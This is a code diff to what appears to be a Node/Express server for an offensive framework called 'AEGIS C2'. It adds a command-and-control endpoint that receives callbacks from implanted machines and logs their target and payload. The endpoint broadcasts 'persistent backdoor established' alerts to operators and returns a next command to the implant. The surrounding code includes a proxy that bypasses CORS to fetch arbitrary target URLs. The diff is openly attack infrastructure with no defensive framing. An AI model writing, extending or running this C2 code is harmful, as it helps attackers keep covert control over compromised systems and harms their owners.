@@ -42,6 +42,25 @@ async function startServer() {
     });
   });
 
+  // C2 Callback Endpoint for Persistent Backdoors
+  app.post("/api/c2/callback", (req, res) => {
+    const { target, status, payload, metadata } = req.body;
+    console.log(`[AEGIS C2] Incoming callback from ${target}: ${status}`);
+    
+    // Broadcast to all clients via socket.io
+    io.emit("new:alert", {
+      id: Math.random().toString(36).substr(2, 9),
+      type: "CRITICAL",
+      message: `[C2 CALLBACK] Persistent backdoor established on ${target}`,
+      timestamp: new Date().toLocaleTimeString(),
+      target: target,
+      status: "ACTIVE",
+      metadata: { ...metadata, payload }
+    });
+
+    res.status(200).json({ status: "ACKNOWLEDGED", next_command: "STAY_SILENT" });
+  });
+
   // OSINT Proxy to bypass CORS for target domains
   app.all("/api/proxy", async (req, res) => {
     const targetUrl = req.headers["x-target-url"] as string;
